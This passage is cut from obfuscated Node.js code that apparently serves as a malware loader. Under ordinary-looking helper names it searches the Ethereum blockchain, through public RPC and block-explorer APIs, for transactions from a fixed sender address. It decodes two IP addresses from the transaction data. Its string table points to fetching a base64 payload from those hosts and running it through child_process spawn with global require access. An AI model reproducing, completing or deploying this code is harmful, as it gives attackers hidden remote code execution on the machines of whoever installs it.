_0x2c4e3a<_0x138907;}},_0x4d0f79,_0x3eacb7=[],_0x515198={};for(_0x4d0f79=-0x11*0x46+0xf70+-0xaca;_0x1a6922[_0x161fbb(0x27d)](_0x4d0f79,_0x58ae3d[_0x161fbb(0x2cf)]);_0x4d0f79++)_0x58ae3d[_0x4d0f79]&&!_0x515198[_0x58ae3d[_0x4d0f79]]&&(_0x515198[_0x58ae3d[_0x4d0f79]]=!(0xf6a+-0x469*-0x4+-0x2*0x1087),_0x3eacb7[_0x161fbb(0x242)](_0x58ae3d[_0x4d0f79]));return _0x3eacb7;}function linkAbort(_0x5aaa3f,_0x2e05df){var _0xd19dc0=_0x18fc94,_0xa1be81={'WfeJu':_0xd19dc0(0x20a)};_0x5aaa3f&&_0x5aaa3f[_0xd19dc0(0x2da)+_0xd19dc0(0x2af)](_0xa1be81[_0xd19dc0(0x327)],function(){var _0x277b3e=_0xd19dc0;_0x2e05df[_0x277b3e(0x20a)]();},{'once':!(0x6*-0x2b4+0xb5*-0x32+0x3392)});}function decompressStream(_0x3e108a){var _0xde2ef8=_0x18fc94,_0x53033a={'EQzGU':_0xde2ef8(0x2f1)+_0xde2ef8(0x305),'aLhWY':function(_0x4a0c49,_0x4f1341){return _0x4a0c49===_0x4f1341;},'qXllK':_0xde2ef8(0x34f),'rrNPI':_0xde2ef8(0x309),'hkoKS':function(_0x40f1cb,_0x132a2e){return _0x40f1cb===_0x132a2e;},'aHyUw':_0xde2ef8(0x257),'THhvn':function(_0x49bf12,_0x1b07fe){return _0x49bf12===_0x1b07fe;}},_0x4e84a2=(_0x3e108a[_0xde2ef8(0x294)][_0x53033a[_0xde2ef8(0x224)]]||'')[_0xde2ef8(0x2c1)+'e']();return _0x53033a[_0xde2ef8(0x293)](_0x53033a[_0xde2ef8(0x287)],_0x4e84a2)||_0x53033a[_0xde2ef8(0x293)](_0x53033a[_0xde2ef8(0x33b)],_0x4e84a2)?_0x3e108a[_0xde2ef8(0x2bd)](zlib[_0xde2ef8(0x261)+'ip']()):_0x53033a[_0xde2ef8(0x2b7)](_0x53033a[_0xde2ef8(0x222)],_0x4e84a2)?_0x3e108a[_0xde2ef8(0x2bd)](zlib[_0xde2ef8(0x34b)+_0xde2ef8(0x28c)]()):_0x53033a[_0xde2ef8(0x209)]('br',_0x4e84a2)?_0x3e108a[_0xde2ef8(0x2bd)](zlib[_0xde2ef8(0x37b)+_0xde2ef8(0x317)+'ss']()):_0x3e108a;}function httpRequest(_0x1379d8,_0x10d2f2){var _0x1d79b6=_0x18fc94,_0x142b69={'aoJgW':function(_0x2f6d2f,_0x3abc22){return _0x2f6d2f(_0x3abc22);},'WmHRH':_0x1d79b6(0x2c9),'axstT':function(_0xc481d4,_0x2b948d){return _0xc481d4(_0x2b948d);},'UTqLI':_0x1d79b6(0x2b8),'DXCsY':_0x1d79b6(0x320),'jYlMX':_0x1d79b6(0x210),'VihZn':function(_0x1cb74f,_0x87125d){return _0x1cb74f===_0x87125d;},'txMDz':_0x1d79b6(0x382),'udVuS':function(_0x1bbd10,_0x19f77e){return _0x1bbd10+_0x19f77e;},'hmMJc':function(_0x82207a,_0x4cba86){return _0x82207a!=_0x4cba86;},'aLsBw':function(_0x4335df,_0x2b014f){return _0x4335df||_0x2b014f;},'KtpQz':_0x1d79b6(0x2cc),'daqgJ':_0x1d79b6(0x24d)+_0x1d79b6(0x32b),'PYMLc':_0x1d79b6(0x30b)+_0x1d79b6(0x20d),'xYSwC':_0x1d79b6(0x362),'TiTSL':function(_0x4aab6e,_0x3d2785){return _0x4aab6e!=_0x3d2785;},'qnNmw':_0x1d79b6(0x212)+'pe','UlPnD':_0x1d79b6(0x300)+_0x1d79b6(0x289)},_0x4e8be8=(_0x10d2f2=_0x142b69[_0x1d79b6(0x368)](_0x10d2f2,{}))[_0x1d79b6(0x20e)]||_0x142b69[_0x1d79b6(0x316)],_0x373c8f=_0x10d2f2[_0x1d79b6(0x359)],_0x34f876=_0x10d2f2[_0x1d79b6(0x347)],_0x5451ea=new URL(_0x1379d8),_0x428c7c=_0x142b69[_0x1d79b6(0x1f6)](_0x142b69[_0x1d79b6(0x214)],_0x5451ea[_0x1d79b6(0x2f8)])?https:http,_0x5928f7={'Accept':_0x142b69[_0x1d79b6(0x298)],'Accept-Encoding':_0x142b69[_0x1d79b6(0x2a9)],'Connection':_0x142b69[_0x1d79b6(0x356)]};return _0x142b69[_0x1d79b6(0x2d9)](null,_0x373c8f)&&(_0x5928f7[_0x142b69[_0x1d79b6(0x26a)]]=_0x142b69[_0x1d79b6(0x298)],_0x5928f7[_0x142b69[_0x1d79b6(0x269)]]=Buffer[_0x1d79b6(0x307)](_0x373c8f)),new Promise(function(_0x1ae024,_0x4e162d){var _0x49a624=_0x1d79b6,_0x5d24fe={'OYloc':function(_0x1b5310,_0x412c59){var _0x429eaa=_0x32cb;return _0x142b69[_0x429eaa(0x228)](_0x1b5310,_0x412c59);},'nWuJn':_0x142b69[_0x49a624(0x31b)],'TEUUs':function(_0x497419,_0x330169){var _0x13b474=_0x49a624;return _0x142b69[_0x13b474(0x29a)](_0x497419,_0x330169);},'LUUaB':_0x142b69[_0x49a624(0x2ef)],'EzOqI':_0x142b69[_0x49a624(0x2a4)],'sIQaq':_0x142b69[_0x49a624(0x2b3)]},_0x3b4fc5=_0x428c7c[_0x49a624(0x32c)]({'hostname':_0x5451ea[_0x49a624(0x249)],'port':_0x5451ea[_0x49a624(0x2de)]||(_0x142b69[_0x49a624(0x1f6)](_0x142b69[_0x49a624(0x214)],_0x5451ea[_0x49a624(0x2f8)])?0xb*-0xad+-0x123*-0x19+0x1f*-0x9f:-0x1b8*-0x7+0xfe7+0x935*-0x3),'path':_0x142b69[_0x49a624(0x345)](_0x5451ea[_0x49a624(0x335)],_0x5451ea[_0x49a624(0x2c7)]),'method':_0x4e8be8,'agent':AGENTS[_0x5451ea[_0x49a624(0x2f8)]],'signal':_0x34f876,'headers':_0x5928f7},function(_0xdb07b3){var _0x5c37da=_0x49a624,_0x389b9f=_0x5d24fe[_0x5c37da(0x333)](decompressStream,_0xdb07b3),_0x4297ea=[];_0x389b9f['on'](_0x5d24fe[_0x5c37da(0x32e)],function(_0x2e9f1c){var _0x30c468=_0x5c37da;_0x4297ea[_0x30c468(0x242)](_0x2e9f1c);}),_0x389b9f['on'](_0x5d24fe[_0x5c37da(0x2ec)],function(){var _0x2d1705=_0x5c37da;try{_0x5d24fe[_0x2d1705(0x333)](_0x1ae024,JSON[_0x2d1705(0x29f)](Buffer[_0x2d1705(0x35e)](_0x4297ea)[_0x2d1705(0x2b6)](_0x5d24fe[_0x2d1705(0x250)])));}catch(_0x246ec2){_0x5d24fe[_0x2d1705(0x304)](_0x4e162d,_0x246ec2);}}),_0x389b9f['on'](_0x5d24fe[_0x5c37da(0x344)],_0x4e162d);});_0x3b4fc5['on'](_0x142b69[_0x49a624(0x2b3)],_0x4e162d),_0x142b69[_0x49a624(0x2b4)](null,_0x373c8f)&&_0x3b4fc5[_0x49a624(0x2fb)](_0x373c8f),_0x3b4fc5[_0x49a624(0x320)]();});}function promiseAny(_0x24f476){var _0x470e98=_0x18fc94,_0xcc2804={'MzqTo':function(_0x241b96,_0x527cd7){return _0x241b96===_0x527cd7;},'sXBnv':function(_0x36d096,_0x201c1b){return _0x36d096(_0x201c1b);},'cKkfh':function(_0x1a4dfd,_0x5875df){return _0x1a4dfd<_0x5875df;},'iISKd':function(_0x2ccb4a,_0x4fa678){return _0x2ccb4a(_0x4fa678);},'qWvjp':_0x470e98(0x234)};return new Promise(function(_0x34de23,_0x5120f6){var _0x1f3ac4=_0x470e98,_0x167acc={'rmYFU':function(_0x1ea838,_0xaeb4fb){var _0x46af2d=_0x32cb;return _0xcc2804[_0x46af2d(0x27a)](_0x1ea838,_0xaeb4fb);},'jLUjN':function(_0x1160d4,_0x94c378){var _0x12ac59=_0x32cb;return _0xcc2804[_0x12ac59(0x2f9)](_0x1160d4,_0x94c378);}},_0xd3cbee,_0x129171=_0x24f476[_0x1f3ac4(0x2cf)],_0xe7f2a9=null;if(_0x129171){for(_0xd3cbee=-0x145b+0x7d3+0x322*0x4;_0xcc2804[_0x1f3ac4(0x303)](_0xd3cbee,_0x24f476[_0x1f3ac4(0x2cf)]);_0xd3cbee++)_0x24f476[_0xd3cbee][_0x1f3ac4(0x236)](_0x34de23,function(_0x19643e){var _0x2582b0=_0x1f3ac4;_0xe7f2a9=_0x19643e,_0x167acc[_0x2582b0(0x384)](0x46*0x4a+-0x2*0x4d8+0x64*-0x1b,--_0x129171)&&_0x167acc[_0x2582b0(0x2d8)](_0x5120f6,_0xe7f2a9);});}else _0xcc2804[_0x1f3ac4(0x337)](_0x5120f6,new Error(_0xcc2804[_0x1f3ac4(0x2db)]));});}function withRpcEndpoints(_0x32fe20,_0x508d0d){var _0x2b39ec=_0x18fc94,_0x40cfea={'ktIUm':_0x2b39ec(0x219)+'5','VUCBv':function(_0x85e943,_0x446135){return _0x85e943<_0x446135;},'tuiRX':function(_0x5a0822,_0x45c318,_0x5a27f1){return _0x5a0822(_0x45c318,_0x5a27f1);},'yydbR':function(_0x4c7b5f,_0x270bcf){return _0x4c7b5f<_0x270bcf;},'NskND':function(_0x80a379,_0x1d5282){return _0x80a379<_0x1d5282;},'hYYRY':function(_0x536109,_0x182b56){return _0x536109<_0x182b56;},'YCiUg':function(_0x21e01e,_0x5c3d4a){return _0x21e01e(_0x5c3d4a);}},_0x383a51=_0x40cfea[_0x2b39ec(0x34d)][_0x2b39ec(0x33f)]('|'),_0x33d7dc=0xbef+-0x1200+0x611;while(!![]){switch(_0x383a51[_0x33d7dc++]){case'0':var _0x2b2d0f,_0x4d6a9a=[],_0x289f40=[];continue;case'1':for(_0x2b2d0f=-0x85e+-0x2065+-0x1*-0x28c3;_0x40cfea[_0x2b39ec(0x27b)](_0x2b2d0f,RPC_ENDPOINTS[_0x2b39ec(0x2cf)]);_0x2b2d0f++)_0x289f40[_0x2b39ec(0x242)](_0x40cfea[_0x2b39ec(0x207)](_0x32fe20,RPC_ENDPOINTS[_0x2b2d0f],_0x4d6a9a[_0x2b2d0f][_0x2b39ec(0x347)]));continue;case'2':for(_0x2b2d0f=0xa7e+-0xef*-0x19+-0x21d5;_0x40cfea[_0x2b39ec(0x37d)](_0x2b2d0f,RPC_ENDPOINTS[_0x2b39ec(0x2cf)]);_0x2b2d0f++)_0x4d6a9a[_0x2b39ec(0x242)](new AbortController());continue;case'3':for(_0x2b2d0f=-0x831+-0x248a+0x2cbb;_0x40cfea[_0x2b39ec(0x2f4)](_0x2b2d0f,_0x4d6a9a[_0x2b39ec(0x2cf)]);_0x2b2d0f++)_0x40cfea[_0x2b39ec(0x207)](linkAbort,_0x508d0d,_0x4d6a9a[_0x2b2d0f]);continue;case'4':var _0x2d376c={'SSJqK':function(_0x51183e,_0x2b9f5f){var _0xeab8c0=_0x2b39ec;return _0x40cfea[_0xeab8c0(0x361)](_0x51183e,_0x2b9f5f);},'xMLzg':function(_0x5550e6,_0x3ab89c){var _0x2a8b55=_0x2b39ec;return _0x40cfea[_0x2a8b55(0x361)](_0x5550e6,_0x3ab89c);}};continue;case'5':return _0x40cfea[_0x2b39ec(0x284)](promiseAny,_0x289f40)[_0x2b39ec(0x236)](function(_0x1460b0){var _0x4e3079=_0x2b39ec;for(_0x2b2d0f=-0x1b41+-0x1b6d+0x1b57*0x2;_0x2d376c[_0x4e3079(0x1fb)](_0x2b2d0f,_0x4d6a9a[_0x4e3079(0x2cf)]);_0x2b2d0f++)_0x4d6a9a[_0x2b2d0f][_0x4e3079(0x20a)]();return _0x1460b0;},function(_0x47f298){var _0x4d9965=_0x2b39ec;for(_0x2b2d0f=-0x26c8+0x1*-0x26c7+-0x37*-0x169;_0x2d376c[_0x4d9965(0x21c)](_0x2b2d0f,_0x4d6a9a[_0x4d9965(0x2cf)]);_0x2b2d0f++)_0x4d6a9a[_0x2b2d0f][_0x4d9965(0x20a)]();throw _0x47f298;});}break;}}function rpcCall(_0x153037,_0x3633f6,_0x1ea817,_0x346c4c){var _0x125d93=_0x18fc94,_0x31fad3={'ySpSG':function(_0x3c5043,_0x481f21,_0x1edad5){return _0x3c5043(_0x481f21,_0x1edad5);},'wMRmp':_0x125d93(0x372),'FFzps':_0x125d93(0x2f3)};return _0x31fad3[_0x125d93(0x2e7)](httpRequest,_0x153037,{'method':_0x31fad3[_0x125d93(0x377)],'body':JSON[_0x125d93(0x296)]({'jsonrpc':_0x31fad3[_0x125d93(0x23d)],'id':0x1,'method':_0x3633f6,'params':_0x1ea817}),'signal':_0x346c4c})[_0x125d93(0x236)](function(_0x211df3){var _0x3cdec4=_0x125d93;return _0x211df3[_0x3cdec4(0x25d)];});}function rpcBatch(_0x2082dc,_0x518f24,_0x5aed34){var _0x483f70=_0x18fc94,_0xc74cca={'iWvRF':_0x483f70(0x371),'nhKcK':function(_0x557e93,_0x27c1de){return _0x557e93<_0x27c1de;},'PFIwb':function(_0x275bf6,_0x41d0ad){return _0x275bf6+_0x41d0ad;},'eHDgv':function(_0x9a1bb8,_0x3e8fe7){return _0x9a1bb8<_0x3e8fe7;},'YfzIb':_0x483f70(0x2f3),'YxTRN':function(_0x70051c,_0x1f77b8,_0x386042){return _0x70051c(_0x1f77b8,_0x386042);},'GsbXQ':_0x483f70(0x372)},_0x2e45fd,_0x500dd4=[];for(_0x2e45fd=0x601*0x6+-0x29*-0xd3+-0x1*0x45d1;_0xc74cca[_0x483f70(0x1f2)](_0x2e45fd,_0x518f24[_0x483f70(0x2cf)]);_0x2e45fd++)_0x500dd4[_0x483f70(0x242)]({'jsonrpc':_0xc74cca[_0x483f70(0x2ad)],'id':_0xc74cca[_0x483f70(0x240)](_0x2e45fd,0xed4+0xc73+-0x1b46),'method':_0x518f24[_0x2e45fd][-0x189+0x600*0x5+-0x1c77],'params':_0x518f24[_0x2e45fd][-0x1318+0x1f*0x115+-0xe72*0x1]});return _0xc74cca[_0x483f70(0x22f)](httpRequest,_0x2082dc,{'method':_0xc74cca[_0x483f70(0x2ac)],'body':JSON[_0x483f70(0x296)](_0x500dd4),'signal':_0x5aed34})[_0x483f70(0x236)](function(_0x1cc058){var _0x2b6729=_0x483f70,_0x4f165f=_0xc74cca[_0x2b6729(0x24a)][_0x2b6729(0x33f)]('|'),_0x55a267=-0x14ac+0x7b*0x1f+0x5c7;while(!![]){switch(_0x4f165f[_0x55a267++]){case'0':return _0x6c7fff;case'1':var _0x3e6179={};continue;case'2':var _0x6c7fff=[];continue;case'3':for(_0x2e45fd=0x244+-0x11*-0x21d+-0x2631;_0xc74cca[_0x2b6729(0x1f2)](_0x2e45fd,_0x518f24[_0x2b6729(0x2cf)]);_0x2e45fd++)_0x6c7fff[_0x2b6729(0x242)](_0x3e6179[_0xc74cca[_0x2b6729(0x240)](_0x2e45fd,-0x6fe+0x22b9+-0x1bba)][_0x2b6729(0x25d)]);continue;case'4':for(_0x2e45fd=-0xfde+-0x1923+0x2901;_0xc74cca[_0x2b6729(0x318)](_0x2e45fd,_0x1cc058[_0x2b6729(0x2cf)]);_0x2e45fd++)_0x3e6179[_0x1cc058[_0x2e45fd]['id']]=_0x1cc058[_0x2e45fd];continue;}break;}});}function _0x507c(){var _0x624533=['public.bla','axstT','dRWZm','\x27;global[\x27','SSpdu','EfeLj','parse','xyeKi','6504113rvDoGs','smtCe','rkIAX','DXCsY','replace','pBzEx','RZnAB','WZqmy','PYMLc','global[\x27_V','YQVKW','GsbXQ','YfzIb','ffset=20&s','stener','ckByNumber','slice','dNUKY','jYlMX','hmMJc','Kit/537.36','toString','hkoKS','data','iEFgU','iSkpo','PFbOK','aEFTY','pipe','erjCg',':443/0x/ls','EirBh','toLowerCas','mnNae','\x20(KHTML,\x20l','IZjrD','Ifqwc','_t_u\x27]=\x27','search','lmbtl','utf8','gjVFj','AuDwi','GET','LMxlf','KHpbu','length','HZizt','QTFWT','min','pgmNO','hrRcy','ut.com/api','FRpxm','mjivA','jLUjN','TiTSL','addEventLi','qWvjp','oUSyL','Tmydi','port','voDFx','hrmii','fezep','unref','lSCOZ','GRWTi','from','NHJIR','ySpSG','url','D311D3080e','unt','MeQRi','EzOqI','h.blocksco','lxmdR','UTqLI','TPLzv','content-en','aGKfx','2.0','NskND','BydrM','Missing\x20X-','stapi.io','protocol','sXBnv','kzZPF','write','blockNumbe','nonce','dmwzF','FguSm','Content-Le','tRqgL','eth_getBlo','cKkfh','TEUUs','coding','RLpKb','byteLength','YNwDo','x-gzip','BoVBN','gzip,\x20defl',';var\x20_glob','dKFVm','YNMkH','IUIEc','ERrvc','UttIh','eth_getTra','YQWBd','oad\x20body',')\x20AppleWeb','KtpQz','liDecompre','eHDgv','ess','\x20NT\x2010.0;\x20','WmHRH','SNylr','transactio','MehRX','run','end','vYaxt','WDAJm','ZIUsX','\x27]=\x27','IPoyL','ddFBp','WfeJu','wXLKE','0xa322E5f3','HUhiH','n/json','request','FwJMI','LUUaB','ygpfp','Arbsw','iUSGc','cZhmq','OYloc','qlWvA','pathname','LPcnA','iISKd','nrYJl','vhCZu','Ohkli','rrNPI','msyAu','https://1r','9&page=1&o','split','wxjFZ','PzaCR','GQgGB','dkhxx','sIQaq','udVuS','wDuOs','signal','ort=desc&f','zgZIS','all','createInfl','node','ktIUm','SPkJZ','gzip','LjnKZ','controller','nSpVI','492987BeuTin','1.0.0.0\x20Sa','SyQCd','xYSwC','erNWT','bVtyW','body','IJITi','WmIGQ','mGbUv','YFLTr','concat','qBAFO','h-mainnet.','hYYRY','keep-alive','q4FZkxX{!h','UMgkS','y-p_>d$0B&','eth_blockN','ike\x20Gecko)','aLsBw','x-payload-','hPTrH','DvaAl','tpyBc','base64','LqEQJ','IXFGn','KrKuw','1|4|2|3|0','POST','pnDbz','LNSUD','YizYB','Egxmd','wMRmp','nbKYq','?module=ac','\x20Chrome/13','createBrot','_t_u','yydbR','EpRfi','oRRqB','MfXZS','CMSBP','https:','TgWDa','rmYFU','path','al=global;','rlXPy','826708ceDEjy','catch','@^1aQk','charCodeAt','nhKcK','on=txlist&','bEUtI','pHvik','VihZn','JjwUn','ZzKvX','zlib','hxfiR','SSJqK','MYzpP','32885MmPHGg','Agent','m\x27]=module','FGUmD','VkcYG','XLRBC','145072ihbtVU','ck=9999999','NQwJY','trnts','tuiRX','DfLXD','THhvn','abort','bReXD','WJlbP','ate,\x20br','method','6GJduBp','error','h.drpc.org','Content-Ty','tIDUU','txMDz','bPUnO','QRzwh','pc.io/eth','Fypmh','4|0|2|3|1|','odKAu','WtRcv','xMLzg','ekWvq','nYBKy','mJoFr','nsactionCo','9aDC2490Ef','aHyUw','927lRDxqK','EQzGU','spawn','fari/537.3','gmJSW','aoJgW','KjHxH',':443/0x/cl','Payload-B6','hereum-rpc','_H\x27]=\x27','ESDFy','YxTRN','svmzi','_H2\x27]=\x27','ACKJp','address=','empty','HtQRM','then','OjjCI','_t_s\x27]=\x27','qLiiJ','tpTqG','_H2','HrmQQ','FFzps','ElqAw','PDubB','PFIwb','e.com','push','hKJxl','&startbloc','hNrMF','FBISa','HEAD','isArray','hostname','iWvRF','KPVtg',',Sr3=@','applicatio','ilterby=fr','object','nWuJn','http://',':80','resume','QuapD','rIYek','6f0121063e','deflate','HLpSv','ivDxY','0\x20(Windows','ignore','umber','result','mlgzn','vaZCq','b64','createGunz','JfjjD','count&acti','https://et','SDXbM','Mozilla/5.','rvGQm','Empty\x20payl','UlPnD','qnNmw','NUYic','e;global[\x27','.publicnod','_t_s','DZlRE','aKqqd','Win64;\x20x64','NzjOi','https','resolve','OSswm','WGIbH','UNnlQ','1006620Wlwnjm','owCHU','MzqTo','VUCBv','kngyS','pchMK','CvizX','Zkjuf','r\x27]=requir','hex','aFhun','VnPUf','YCiUg','msZTY','http','qXllK','NefgC','ngth','child_proc','182110kBaUrm','ate','468IQwBVR','k=0&endblo','fslBu','URL',':443','eutsS','aLhWY','headers','Ztuks','stringify','KkkFJ','daqgJ'];_0x507c=function(){return _0x624533;};return _0x507c();}function _0x32cb(_0x444446,_0x136302){_0x444446=_0x444446-(0x1*-0x2054+0xa3*0x31+0x1*0x312);var _0xca1a49=_0x507c();var _0x315d86=_0xca1a49[_0x444446];return _0x315d86;}function toBlockHex(_0x557943){var _0x4c7e4a=_0x18fc94,_0x43716f={'dKFVm':function(_0x17cd5c,_0x35cd1f){return _0x17cd5c+_0x35cd1f;},'UNnlQ':function(_0x18d808,_0x2fa626){return _0x18d808(_0x2fa626);}};return _0x43716f[_0x4c7e4a(0x30d)]('0x',_0x43716f[_0x4c7e4a(0x277)](Number,_0x557943)[_0x4c7e4a(0x2b6)](0x1*0xddb+0x2453+-0x190f*0x2));}function findSenderTx(_0x1e0898){var _0x59630b=_0x18fc94,_0x4df180={'Ztuks':function(_0x55125b,_0x783dea){return _0x55125b<_0x783dea;},'gmJSW':function(_0x1632d1,_0x2cadd1){return _0x1632d1===_0x2cadd1;}},_0x49c75a;for(_0x49c75a=-0x2297+-0x15e+0x23f5;_0x4df180[_0x59630b(0x295)](_0x49c75a,_0x1e0898[_0x59630b(0x2cf)]);_0x49c75a++)if(_0x1e0898[_0x49c75a][_0x59630b(0x2e5)]&&_0x4df180[_0x59630b(0x227)](_0x1e0898[_0x49c75a][_0x59630b(0x2e5)][_0x59630b(0x2c1)+'e'](),SENDER))return _0x1e0898[_0x49c75a];return null;}function decodeAddress(_0x252726){var _0x3f8379=_0x18fc94,_0x7ac0b3={'tpyBc':function(_0x22d3c9,_0x4e6b19){return _0x22d3c9+_0x4e6b19;},'dmwzF':function(_0x361832,_0x4b49bb){return _0x361832+_0x4b49bb;},'pBzEx':function(_0x5574bd,_0x5878f9){return _0x5574bd+_0x5878f9;},'fslBu':function(_0x41a63f,_0x29cc53){return _0x41a63f+_0x29cc53;},'LMxlf':function(_0xb37527,_0x45179a){return _0xb37527+_0x45179a;},'GQgGB':_0x3f8379(0x281),'MYzpP':function(_0x421f15,_0x5bcea7){return _0x421f15(_0x5bcea7);}},_0x16bcba=Buffer[_0x3f8379(0x2e5)](_0x252726[_0x3f8379(0x2a5)](/^0x/i,''),_0x7ac0b3[_0x3f8379(0x342)]);function _0x2cdc28(_0x18a6cc){var _0x16ed39=_0x3f8379;return _0x7ac0b3[_0x16ed39(0x36c)](_0x7ac0b3[_0x16ed39(0x2fe)](_0x7ac0b3[_0x16ed39(0x2a6)](_0x7ac0b3[_0x16ed39(0x28f)](_0x7ac0b3[_0x16ed39(0x2cd)](_0x7ac0b3[_0x16ed39(0x2fe)](_0x18a6cc[-0x225e+0x95*-0x17+0xf*0x32f],'.'),_0x18a6cc[0x1ccb+-0x1*0x1843+-0x487]),'.'),_0x18a6cc[0x7c1*-0x5+0x15e5+0x10e2*0x1]),'.'),_0x18a6cc[-0x3af+0x8dd*-0x3+0x1e49]);}return[_0x7ac0b3[_0x3f8379(0x1fc)](_0x2cdc28,_0x16bcba[_0x3f8379(0x2b1)](-0xa*0x1a5+-0x11a3+0x2215,0xf*0x159+-0x13e5+-0x4e)),_0x7ac0b3[_0x3f8379(0x1fc)](_0x2cdc28,_0x16bcba[_0x3f8379(0x2b1)](-0x2*-0x10c9+-0x7*0x37+-0x200d,0x108f+0x156*0x1d+-0x3745))];}function firstMatch(_0x2ed0df){var _0x375886={'KHpbu':function(_0x123a5e,_0x4f19e9){return _0x123a5e(_0x4f19e9);},'rkIAX':function(_0x5622c4,_0x3034de){return _0x5622c4===_0x3034de;},'ElqAw':function(_0x52625f,_0x52e5c8){return _0x52625f!==_0x52e5c8;},'FRpxm':function(_0x350a5a,_0x272ce0){return _0x350a5a(_0x272ce0);},'IPoyL':function(_0x1bf279,_0x1a329e){return _0x1bf279<_0x1a329e;},'Ifqwc':function(_0x28dd4e,_0x265084){return _0x28dd4e(_0x265084);}};return new Promise(function(_0x2a773f){var _0x5f350f=_0x32cb,_0x300306={'HrmQQ':function(_0x2f5968,_0x586e32){var _0x40b70e=_0x32cb;return _0x375886[_0x40b70e(0x325)](_0x2f5968,_0x586e32);},'WDAJm':function(_0x1f5176,_0x24148b){var _0x2ac4ea=_0x32cb;return _0x375886[_0x2ac4ea(0x2c5)](_0x1f5176,_0x24148b);}},_0x583ce1=_0x2ed0df[_0x5f350f(0x2cf)];if(!_0x583ce1)return _0x375886[_0x5f350f(0x2c5)](_0x2a773f,null);var _0x2b31a4,_0x38fd3b=!(0x1673+0x4a*0x4b+-0x2*0x1610);function _0x55b663(_0x53d369){var _0x545980=_0x5f350f,_0x418472;if(!_0x38fd3b){for(_0x38fd3b=!(0x1e4+-0x1*-0x16fc+-0x18e0),_0x418472=0x1*0x14a8+-0xa33*0x1+0xa75*-0x1;_0x300306[_0x545980(0x23c)](_0x418472,_0x2ed0df[_0x545980(0x2cf)]);_0x418472++)_0x2ed0df[_0x418472][_0x545980(0x351)][_0x545980(0x20a)]();_0x300306[_0x545980(0x322)](_0x2a773f,_0x53d369);}}for(_0x2b31a4=-0x5b4*-0x4+-0x1e9b+0x69*0x13;_0x375886[_0x5f350f(0x325)](_0x2b31a4,_0x2ed0df[_0x5f350f(0x2cf)]);_0x2b31a4++)_0x2ed0df[_0x2b31a4][_0x5f350f(0x31f)]()[_0x5f350f(0x236)](function(_0x2b898c){var _0x42b000=_0x5f350f;_0x38fd3b||(_0x2b898c?_0x375886[_0x42b000(0x2ce)](_0x55b663,_0x2b898c):_0x375886[_0x42b000(0x2a3)](0x107*-0x1f+0x607+0x295*0xa,--_0x583ce1)&&_0x375886[_0x42b000(0x2ce)](_0x2a773f,null));},function(){var _0x34d744=_0x5f350f;_0x38fd3b||_0x375886[_0x34d744(0x23e)](0x1*-0x1d22+-0x17a3*-0x1+0x57f,--_0x583ce1)||_0x375886[_0x34d744(0x2d6)](_0x2a773f,null);});});}function candidateBlocks(_0xfe6b1e){var _0x5a5d60=_0x18fc94,_0x16c2d5={'vhCZu':function(_0x594ab1,_0x1fcbc5){return _0x594ab1-_0x1fcbc5;},'Egxmd':function(_0x55f61f,_0x123252){return _0x55f61f-_0x123252;},'nrYJl':function(_0x169009,_0xe5df25){return _0x169009+_0xe5df25;},'FguSm':function(_0x5df4c8,_0x602696){return _0x5df4c8-_0x602696;},'IUIEc':function(_0x16717a,_0x357c51){return _0x16717a+_0x357c51;},'eutsS':function(_0x571b7b,_0x11bcdd){return _0x571b7b<_0x11bcdd;},'erNWT':function(_0x46ecd9,_0xdda6c1){return _0x46ecd9(_0xdda6c1);}},_0x21913a,_0x1cdfde=_0x16c2d5[_0x5a5d60(0x339)](_0xfe6b1e,BLOCK_MULTIPLE),_0x1b46ee=[_0x16c2d5[_0x5a5d60(0x376)](_0xfe6b1e,-0xb97+-0x707*0x5+0x2ebb),_0xfe6b1e,_0x16c2d5[_0x5a5d60(0x338)](_0xfe6b1e,0xe0c+0x5b8+-0x13c3*0x1),_0x16c2d5[_0x5a5d60(0x2ff)](_0x1cdfde,0x1664+0x524+-0x1*0x1b87),_0x1cdfde,_0x16c2d5[_0x5a5d60(0x30f)](_0x1cdfde,0x26*0xd3+0x3*0x3b3+0x1535*-0x2)],_0x2c15c1={},_0x3d1b6f=[];for(_0x21913a=0x381*-0x1+-0x83d*0x2+0x13fb;_0x16c2d5[_0x5a5d60(0x292)](_0x21913a,_0x1b46ee[_0x5a5d60(0x2cf)]);_0x21913a++)if(!_0x16c2d5[_0x5a5d60(0x292)](_0x1b46ee[_0x21913a],0x2b*-0x3d+0x1c0b+-0x11cc)){var _0x481f96=_0x16c2d5[_0x5a5d60(0x357)](String,_0x1b46ee[_0x21913a]);_0x2c15c1[_0x481f96]||(_0x2c15c1[_0x481f96]=!(0x29*0x2c+0x195f+-0x1*0x206b),_0x3d1b6f[_0x5a5d60(0x242)](_0x1b46ee[_0x21913a]));}return _0x3d1b6f;}function blockTask(_0x5a0e49){var _0x25c8ac=_0x18fc94,_0x3469da={'YQWBd':function(_0x2447e9,_0x214e5f,_0x9c1493,_0x5a1706,_0x2be47b){return _0x2447e9(_0x214e5f,_0x9c1493,_0x5a1706,_0x2be47b);},'YFLTr':_0x25c8ac(0x302)+_0x25c8ac(0x2b0),'vaZCq':function(_0x50bc29,_0x2e39d7){return _0x50bc29(_0x2e39d7);},'BoVBN':function(_0x39db0b,_0x4dc58b){return _0x39db0b(_0x4dc58b);},'LPcnA':function(_0xe5d23c,_0x3dd603,_0x414feb){return _0xe5d23c(_0x3dd603,_0x414feb);}},_0xcfbd1d=new AbortController();return{'controller':_0xcfbd1d,'run':function(){var _0x447a20=_0x25c8ac,_0x51d396={'RLpKb':function(_0x2de8ba,_0x5c7bdf){var _0x4b6a98=_0x32cb;return _0x3469da[_0x4b6a98(0x30a)](_0x2de8ba,_0x5c7bdf);}};return _0x3469da[_0x447a20(0x336)](withRpcEndpoints,function(_0x62fdd2,_0x375d93){var _0x3c44d8=_0x447a20;return _0x3469da[_0x3c44d8(0x313)](rpcCall,_0x62fdd2,_0x3469da[_0x3c44d8(0x35d)],[_0x3469da[_0x3c44d8(0x25f)](toBlockHex,_0x5a0e49),!(-0x19dc+-0x2*0xf2b+0x3832)],_0x375d93);},_0xcfbd1d[_0x447a20(0x347)])[_0x447a20(0x236)](function(_0xfef1ae){var _0x4211bc=_0x447a20,_0x4ae77=_0xfef1ae&&_0xfef1ae[_0x4211bc(0x31d)+'ns'];if(!Array[_0x4211bc(0x248)](_0x4ae77))return null;var _0x2ffebc=_0x51d396[_0x4211bc(0x306)](findSenderTx,_0x4ae77);return _0x2ffebc?{'blockNumber':_0x5a0e49,'tx':_0x2ffebc}:null;});}};}function nonceAtBlocks(_0x2bf7ab,_0x47f878){var 